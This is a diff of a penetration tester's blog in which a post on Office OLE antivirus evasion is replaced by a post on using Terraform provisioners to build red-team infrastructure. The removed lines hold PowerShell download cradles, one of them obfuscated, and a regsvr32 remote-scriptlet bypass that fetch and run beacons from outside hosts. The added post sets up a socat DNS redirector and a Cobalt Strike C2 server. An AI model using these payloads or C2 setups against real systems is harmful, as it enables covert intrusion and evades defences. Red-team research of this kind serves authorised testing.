@@ -23,7 +23,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.26">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>How to Accidently Win Against AV</title>
+    <title>Automated Red Team Infrastructure Deployment with Terraform - Part 2</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
@@ -31,19 +31,25 @@
     
 
     
-    <meta name="description" content="Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.
+    <meta name="description" content="Introduction
+
+In Part 1, we looked at using Terraform to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.
 
 ">
-    <meta property="og:description" content="Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.
+    <meta property="og:description" content="Introduction
+
+In Part 1, we looked at using Terraform to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.
 
 ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="How to Accidently Win Against AV">
-    <meta property="og:url" content="/2017/07/how-to-accidently-win-against-av/">
+    <meta property="og:title" content="Automated Red Team Infrastructure Deployment with Terraform - Part 2">
+    <meta property="og:url" content="/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.
+    <meta name="twitter:description" content="Introduction
+
+In Part 1, we looked at using Terraform to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.
 
 ">
     
@@ -59,7 +65,7 @@
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/antivirus/av_icon.png">
+      <meta property="og:image" content="https://rastamouse.me/images/terraform/icon.png">
     
     
     
@@ -251,18 +257,18 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      How to Accidently Win Against AV
+      Automated Red Team Infrastructure Deployment with Terraform - Part 2
     </h1>
   
   <div class="postShorten-meta post-meta">
   
-    <time itemprop="datePublished" datetime="2017-07-05T00:00:00Z">
+    <time itemprop="datePublished" datetime="2017-09-23T00:00:00Z">
       
   
   
   
   
-    5 July 2017
+    23 September 2017
   
 
     </time>
@@ -283,96 +289,257 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.</p>
+              <h2 id="introduction">Introduction</h2>
+
+<p>In <a href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/"><b>Part 1</b></a>, we looked at using <a href="https://www.terraform.io/">Terraform</a> to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.</p>
 
 <p></p>
 
-<p>The majority of penetration testers and red teamers will have experienced a situation where they&rsquo;ve needed to bypass an antivirus solution to execute malicious code (either pre or post exploitation).  Frameworks such as <a href="https://github.com/Veil-Framework/Veil">Veil</a> make hundereds of different techniques accessible at the push of a button.</p>
+<h2 id="provisioners">Provisioners</h2>
 
-<p>Social engineering is a common element during engagements - especially of the Red Team variety.  Whether you&rsquo;re doing phishing or a USB drop, delivering malicious Office documents is a very popular way of getting malicious code execution.  This is due, in no small way, to Office having native tools that can be leveraged, such as macro&rsquo;s, OLE and PowerPoint Custom Actions.  Many businesses use macro&rsquo;s legitimately to do clever things in Excel docs; OLE to distribute other files within documents and so on.  This means that seeing macro&rsquo;s and embedded objects is not out of place, it&rsquo;s BAU.  The challenge for users, AV vendors and Blue Teams, is differentiating the benige from the hostile and striking that balance between not blocking enough and blocking too much.</p>
+<p>Terraform has a number of <a href="https://www.terraform.io/docs/provisioners/index.html">provisioners</a> that can be used for this purpose - we&rsquo;ll explore <code>file</code>, <code>local-exec</code>, <code>remote-exec</code> and some of the cool things you can do with them.</p>
 
-<p>Anybody following <a href="https://twitter.com/JohnLaTwC">John Lambert</a> will know that malicious OLE&rsquo;s are on the map right now and there are some great examples of rather complex and sophisticated payloads.  But do they have to be&hellip;?  Well obviously that depends on the maturity of your target, but I was interested to find out just what the state of play is with AV vs OLE.</p>
+<h3 id="connection">Connection</h3>
 
-<p>To the laboratory.</p>
+<p>Some of the provisioners require remote access to the VM resources, which, for Linux, can be done via SSH.  You will see a <code>connection {}</code> block in some of the examples below.  SSH connections support both <code>password</code> and <code>publickey</code> authentication methods.</p>
 
+<h3 id="local-exec">Local Exec</h3>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/antivirus/dexters-lab.jpg" />
-    
-    
-</figure>
+<p>The <code>local-exec</code> provisioner allow you to run shell commands on your local machine.</p>
 
-
-<p>This is the mock Word doc.  In all cases, the OLE is a simple batch file, called <code>unlock.bat</code> that contains my malicious code.  All it requires is the user to run the file.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/antivirus/doc.png" />
-    
-    
-</figure>
-
-
-<h3 id="test-1">Test 1</h3>
-
-<p>The first test contains the most basic PowerShell download cradle to grab and run a staged http beacon.</p>
-
-<pre><code>powershell.exe -nop -w hidden -c &quot;iex ((new-object net.webclient).downloadstring('http://kobaruto.duckdns.org/a'))&quot;
+<pre><code class="language-text">provisioner &quot;local-exec&quot; {
+    command = &quot;something&quot;
+}
 </code></pre>
 
-<p>This resulted in only 1 hit on VT.  Congrats ClamAV&hellip;</p>
+<h4 id="example">Example</h4>
 
+<p>This is quite useful for writing information about your infrastructure to file.  It also has a method for running a different command when an instance is destroyed.</p>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/antivirus/vt1.png" />
-    
-    
-</figure>
+<pre><code class="language-text">resource &quot;digitalocean_droplet&quot; &quot;paydel&quot; {
+    image = &quot;ubuntu-14-04-x64&quot;
+    name = &quot;payload-delivery&quot;
+    region = &quot;lon1&quot;
+    size = &quot;512mb&quot;
+    ssh_keys = [&quot;${digitalocean_ssh_key.rasta.id}&quot;]
 
+    provisioner &quot;local-exec&quot; {
+        command = &quot;echo ${digitalocean_droplet.paydel.ipv4_address}&gt;&gt;paydel-ip.txt&quot;
+    }
 
-<h3 id="test-2">Test 2</h3>
-
-<p>The second test uses the same download cradle as above, but run through <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> with the <code>AES Encoding</code> and <code>CMD + PowerShell Launcher</code> options.</p>
-
-<pre><code>CMd   /C POwERSHeLl -WINDowSTY HIddEn -NonInTEr -NoprOFi   &quot;. ( $vERboSeprEFERenCE.tosTRINg()[1,3]+'x'-JOiN'') (([rUntImE.inTEROpsERvICES.marsHaL]::pTRtOsTRinGUNi([ruNTImE.inTEropsERvICES.maRshaL]::SECUReSTRINGTOgLoBalAlLoCUNIcoDe( $('76492d1116743f0423413b16050a5345MgB8ADQAbgB5AFkAegBvAG0AdwBkAEMAaQBIAHMAVABkAEkAQwBCAC8AegBDAGcAPQA9AHwANgBjADQAMAA4ADgAYwA2ADAAYQAyAGUANgA5AGIAOQBiADQAOQA1ADQAZABjADEAMwBkAGMAMgBjAGIANAA4ADYANABmADcAZgBiADEANABjADUAYwBkADUAYwBjAGEAZAAzADgAOQBmADAAYQBjADUAYwA3ADAAMwA3ADUAMgA5ADIANgA3ADMAMABkADIAZgAxADEANABkAGEAZgBjADAAMQA1ADQAMgBjADEANQAwADMAYQAzAGYAZAA3ADQAOABhAGEAOAA4ADkAYwAwAGUAYwAyAGEAZQBiADQAYwAzADcANAA5ADMAZgAxADQAZAA4ADkAZgAxAGQAMAAxADAAOAA3AGIAOQBiADQAOQA3ADgANQBmAGQAZgAxADcAYQBjADEAMgBhADkAZAAzADEAMQA0AGUANQA0ADMANgA5AGEAMgA2ADYANQAwAGMANwBmADgAMwAyADYANAAwAGIAYwA0AGQAOABlADgANAA2ADUAZgAwAGMAYgA2AGQAOAAwADgAOABjAGIAYQAxADIANwBkADMAYwA0ADgANQA2ADAAMAA0AGIANwA4AGMAZABiADIAOABkADQAYQA0AGEAOAA5ADcAMgBhAGQAYgA5ADkAMQBiAGIAOQBhADIAMwBiAGUAOQA2AGIANABmADQANwA1ADUAOQA3AGUAZgAzADEANAA4AGQANAA4AGEAYwA2ADcAMQAwADgAOQAzAGQAYgA4AGYAMwA1ADQAOAA4ADQAMQBjAGIAZQBhADMAYwAzAGEAMABkADQAMgA0AGYAZgBmADIAOAA2ADAAZAA4AGIAYQBkADkAYwBhAGEANwBkADEAMwBmAGIAYQAzADgAMgBlAGQAYgBkADMANgBmADcAYQAxAGQAYgA1ADYANwA1ADcANABmADAAZAAzADUAMgA0ADEANQA1ADYAMwA='|CoNveRTto-seCurEStRING -KE (11..34)))) ) )&quot;
+    provisioner &quot;local-exec&quot; {
+        when = &quot;destroy&quot;
+        command = &quot;del paydel-ip.txt&quot;
+    }
+}
 </code></pre>
 
-<p>0 hits.</p>
+<h4 id="verification">Verification</h4>
 
+<pre><code class="language-text">digitalocean_droplet.paydel: Creation complete (ID: 63586802)
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/antivirus/vt2.png" />
-    
-    
-</figure>
+Apply complete! Resources: 7 added, 0 changed, 0 destroyed.
 
+Outputs:
 
-<h3 id="test-3">Test 3</h3>
+paydel-ip = 138.68.180.21
 
-<p>The third used some of the application whitelisting bypass work by <a href="https://gist.githubusercontent.com/subTee/618d40aa4229581925eb9025429d8420/raw/e054741f26850e87ed1b14c7cd039471d2945fd0/example.cs">Casey Smith</a>.</p>
-
-<pre><code>regsvr32 /s /u /n /i:https://gist.githubusercontent.com/rasta-mouse/b93a7eafacee04837fb59b53ca27025c/raw/203c8b0740313a91147d7c33e3e4a278b4863d73/http.sct scrobj.dll
+PS C:\Users\Rasta\Desktop\terraform&gt; gc .\paydel-ip.txt
+138.68.180.21
 </code></pre>
 
-<p>0 hits.</p>
+<pre><code class="language-text">Destroy complete! Resources: 7 destroyed.
 
+PS C:\Users\Rasta\Desktop\terraform&gt; gc .\paydel-ip.txt
+gc : Cannot find path 'C:\Users\Rasta\Desktop\terraform\paydel-ip.txt' because it does not exist.
+</code></pre>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/antivirus/vt3.png" />
-    
-    
-</figure>
+<h3 id="remote-exec">Remote Exec</h3>
 
+<p>The <code>remote-exec</code> provisioner allows you to run shell commands on the VM, but be aware that some environment variables may not be available.</p>
 
-<p>At this point, I kinda gave up - the whole thing is clearly broken&hellip;  I didn&rsquo;t expect the AV to fair particularly well, but it surprised me just how little AV seems to detect in OLE.
-Of course on a real engagement there are other considerations apart from AV, this was just a simple experiment.</p>
+<pre><code class="language-text">provisioner &quot;remote-exec&quot; {
+    inline = [
+        &quot;touch /root/test.txt&quot;
+    ]
+}
+</code></pre>
 
-<p>The other mad thing is, I received a beacon from one of the VT sandboxes and it still didn&rsquo;t flag it as malicious&hellip;</p>
+<h4 id="example-1">Example</h4>
+
+<p>The DNS redirector VM was designed to receive incoming DNS requests and redirect them to the DNS C2 server.  To do that, we need to:</p>
+
+<ul>
+<li>Install Socat</li>
+<li>Configure the VM to start socat on boot</li>
+<li>Reboot the VM</li>
+</ul>
+
+<pre><code class="language-text">resource &quot;aws_instance&quot; &quot;dns-rdir&quot; {
+    ami = &quot;ami-489f8e2c&quot; # Amazon Linux AMI 2017.03.1
+    instance_type = &quot;t2.micro&quot;
+    key_name = &quot;${aws_key_pair.rasta.key_name}&quot;
+    vpc_security_group_ids = [&quot;${aws_security_group.dns-rdir.id}&quot;]
+    subnet_id = &quot;${aws_subnet.default.id}&quot;
+    associate_public_ip_address = true
+
+    provisioner &quot;remote-exec&quot; {
+        inline = [
+            &quot;sudo yum -y update&quot;,
+            &quot;sudo yum -y install socat&quot;,
+            &quot;echo \&quot;socat udp4-listen:53,reuseaddr,fork udp:${digitalocean_droplet.dns-c2.ipv4_address}; echo -ne \\n &amp;\&quot; | sudo tee -a /etc/rc.local&quot;,
+            &quot;sudo reboot&quot;
+        ]
+
+        connection {
+            type = &quot;ssh&quot;
+            user = &quot;ec2-user&quot;
+            private_key = &quot;${file(&quot;${var.private-key}&quot;)}&quot;
+        }
+    }
+}
+</code></pre>
+
+<p>Because these are relatively simple tasks - we can just do them on the command line.  The other advantage you can see, is that we don&rsquo;t need to know what the IP address of the DNS C2 server will be up front - we can just reference it through Terraform and it will take care of the rest :)</p>
+
+<h4 id="verification-1">Verification</h4>
+
+<pre><code class="language-text">[root@ip-10-0-0-163 ~]# cat /etc/rc.local
+#!/bin/sh
+#
+# This script will be executed *after* all the other init scripts.
+# You can put your own initialization stuff in here if you don't
+# want to do the full Sys V style init stuff.
+
+touch /var/lock/subsys/local
+socat udp4-listen:53,reuseaddr,fork udp:178.62.42.201; echo -ne \n &amp;
+</code></pre>
+
+<pre><code class="language-text">[root@ip-10-0-0-163 ~]# ps aux | grep [s]ocat
+root      2527  0.0  0.3  42408  3972 ?        S    Sep23   0:00 socat udp4-listen:53,reuseaddr,fork udp:178.62.42.201
+</code></pre>
+
+<h3 id="file">File</h3>
+
+<p>The <code>file</code> provisioner is simply used to copy files or directories from your local machine to the VM.</p>
+
+<pre><code class="language-text">provisioner &quot;file&quot; {
+    source      = &quot;test.txt&quot;
+    destination = &quot;/root/test.txt&quot;
+}
+</code></pre>
+
+<h4 id="example-2">Example</h4>
+
+<p>The HTTP C2 VM was designed to be an HTTP/S Cobalt Strike server.  To do that, we need to:</p>
+
+<ul>
+<li>Install Oracle Java</li>
+<li>Install git</li>
+<li>Download &amp; extract Cobalt Strike</li>
+<li>Clone Raphael&rsquo;s Malleable C2 repo</li>
+</ul>
+
+<p>This is a little more complicated, so we could write a bash script to do all the work:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+apt -y update
+apt -y install git
+
+mkdir /usr/local/java
+curl -s -j -L -H &quot;Cookie: oraclelicense=accept-securebackup-cookie&quot; http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gz -o /usr/local/java/jdk-8u144-linux-x64.tar.gz
+cd /usr/local/java
+tar zxf jdk-8u144-linux-x64.tar.gz
+echo &quot;JAVA_HOME=/usr/local/java/jdk1.8.0_144&quot; &gt;&gt; /etc/profile
+echo &quot;JRE_HOME=/usr/local/java/jdk1.8.0_144/jre&quot; &gt;&gt; /etc/profile
+echo &quot;PATH=$PATH:/usr/local/java/jdk1.8.0_144/bin:/usr/local/java/jdk1.8.0_144/jre/bin&quot; &gt;&gt; /etc/profile
+echo &quot;export JAVA_HOME&quot; &gt;&gt; /etc/profile
+echo &quot;export JRE_HOME&quot; &gt;&gt; /etc/profile
+echo &quot;export PATH&quot; &gt;&gt; /etc/profile
+update-alternatives --install &quot;/usr/bin/java&quot; &quot;java&quot; &quot;/usr/local/java/jdk1.8.0_144/bin/java&quot; 1
+update-alternatives --install &quot;/usr/bin/javaws&quot; &quot;javaws&quot; &quot;/usr/local/java/jdk1.8.0_144/bin/javaws&quot; 1
+update-alternatives --set java /usr/local/java/jdk1.8.0_144/bin/java
+update-alternatives --set javaws /usr/local/java/jdk1.8.0_144/bin/javaws
+rm /usr/local/java/jdk-8u144-linux-x64.tar.gz
+
+key='xxxx-xxxx-xxxx-xxxx'
+token=`curl -s https://www.cobaltstrike.com/download -d &quot;dlkey=${key}&quot; | grep 'href=&quot;/downloads/' | cut -d '/' -f3`
+curl -s https://www.cobaltstrike.com/downloads/${token}/cobaltstrike-trial.tgz -o /tmp/cobaltstrike.tgz
+mkdir /opt/cobaltstrike
+tar zxf /tmp/cobaltstrike.tgz -C /opt
+echo ${key} &gt; /root/.cobaltstrike.license
+rm /tmp/cobaltstrike.tgz
+
+git clone https://github.com/rsmudge/Malleable-C2-Profiles.git /opt/cobaltstrike/c2
+</code></pre>
+
+<p>We can then combine provisioners, i.e. use <code>file</code> to upload the script and <code>remote-exec</code> to execute it.  They are executed in the order placed (from top to bottom).</p>
+
+<pre><code class="language-text">resource &quot;digitalocean_droplet&quot; &quot;http-c2&quot; {
+    image = &quot;ubuntu-14-04-x64&quot;
+    name = &quot;http-c2&quot;
+    region = &quot;lon1&quot;
+    size = &quot;2gb&quot;
+    ssh_keys = [&quot;${digitalocean_ssh_key.rasta.id}&quot;]
+
+    provisioner &quot;file&quot; {
+        source = &quot;scripts\\install-c2.txt&quot;
+        destination = &quot;/tmp/install-c2.sh&quot;
+
+        connection {
+            type = &quot;ssh&quot;
+            user = &quot;ec2-user&quot;
+            private_key = &quot;${file(&quot;${var.private-key}&quot;)}&quot;
+        }
+    }
+
+    provisioner &quot;remote-exec&quot; {
+        inline = [
+            &quot;chmod +x /tmp/install-c2.sh&quot;,
+            &quot;/tmp/install-c2.sh&quot;,
+            &quot;rm -rf /tmp/*&quot;
+        ]
+
+        connection {
+            type = &quot;ssh&quot;
+            user = &quot;ec2-user&quot;
+            private_key = &quot;${file(&quot;${var.private-key}&quot;)}&quot;
+        }
+    }
+}
+</code></pre>
+
+<h4 id="verification-2">Verification</h4>
+
+<pre><code class="language-text">root@http-c2:~# java -version
+java version &quot;1.8.0_144&quot;
+Java(TM) SE Runtime Environment (build 1.8.0_144-b01)
+Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode)
+</code></pre>
+
+<pre><code class="language-text">root@http-c2:~# ll /opt/cobaltstrike/
+total 21748
+drwxr-xr-x 4  501 dialout     4096 Sep 24 10:22 ./
+drwxr-xr-x 3 root root        4096 Sep 24 10:22 ../
+-rwxr-xr-x 1  501 dialout      126 Sep 21 02:49 agscript*
+drwxr-xr-x 6 root root        4096 Sep 24 10:22 c2/
+-rwxr-xr-x 1  501 dialout      144 Sep 21 02:49 c2lint*
+-rwxr-xr-x 1  501 dialout       93 Sep 21 02:49 cobaltstrike*
+-rw-r--r-- 1  501 dialout 21638284 Sep 21 02:49 cobaltstrike.jar
+-rw-r--r-- 1  501 dialout    96104 Sep 21 02:49 icon.jpg
+-rw-r--r-- 1  501 dialout    87101 Sep 21 02:49 license.pdf
+-rw-r--r-- 1  501 dialout    25388 Sep 21 02:49 readme.txt
+-rw-r--r-- 1  501 dialout   103682 Sep 21 02:49 releasenotes.txt
+-rwxr-xr-x 1  501 dialout     1865 Sep 21 02:49 teamserver*
+drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
+-rwxr-xr-x 1  501 dialout       87 Sep 21 02:49 update*
+-rw-r--r-- 1  501 dialout   266484 Sep 21 02:49 update.jar
+</code></pre>
+
+<h2 id="closing">Closing</h2>
+
+<p>These were just 3 examples of ways to use Terraform Provisioners to execute post-build tasks - hopefully they will give you ideas about how you can automate your own complete builds.</p>
               
             </div>
           </div>
@@ -384,11 +551,11 @@ Of course on a real engagement there are other considerations apart from AV, thi
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/antivirus/">antivirus</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/red-team/">red team</a>
 
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/office/">office</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/infrastructure/">infrastructure</a>
 
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/ole/">ole</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/terraform/">terraform</a>
 
                   </div>
                 
@@ -400,7 +567,7 @@ Of course on a real engagement there are other considerations apart from AV, thi
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/07/de-ice-s1.100/" data-tooltip="De-ICE S1.100">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -408,7 +575,7 @@ Of course on a real engagement there are other considerations apart from AV, thi
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/cobalt-strike---spawn-as/" data-tooltip="Cobalt Strike - Spawn As">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/" data-tooltip="Jumping Network Segregation with RDP">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -425,17 +592,17 @@ Of course on a real engagement there are other considerations apart from AV, thi
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -481,7 +648,7 @@ Of course on a real engagement there are other considerations apart from AV, thi
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/07/de-ice-s1.100/" data-tooltip="De-ICE S1.100">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -489,7 +656,7 @@ Of course on a real engagement there are other considerations apart from AV, thi
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/cobalt-strike---spawn-as/" data-tooltip="Cobalt Strike - Spawn As">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/" data-tooltip="Jumping Network Segregation with RDP">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -506,17 +673,17 @@ Of course on a real engagement there are other considerations apart from AV, thi
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -543,17 +710,17 @@ Of course on a real engagement there are other considerations apart from AV, thi
       <div id="share-options-bar" class="share-options-bar" data-behavior="4">
   <ul class="share-options">
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
         <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
         <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
         <i class="fa fa-twitter"></i><span>Share on Twitter</span>
       </a>
     </li>
@@ -865,9 +1032,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/rastamouse.me\/2017\/07\/how-to-accidently-win-against-av\/';
+          this.page.url = 'https:\/\/rastamouse.me\/2017\/09\/automated-red-team-infrastructure-deployment-with-terraform---part-2\/';
           
-            this.page.identifier = '\/2017\/07\/how-to-accidently-win-against-av\/'
+            this.page.identifier = '\/2017\/09\/automated-red-team-infrastructure-deployment-with-terraform---part-2\/'
           
         };
         (function() {
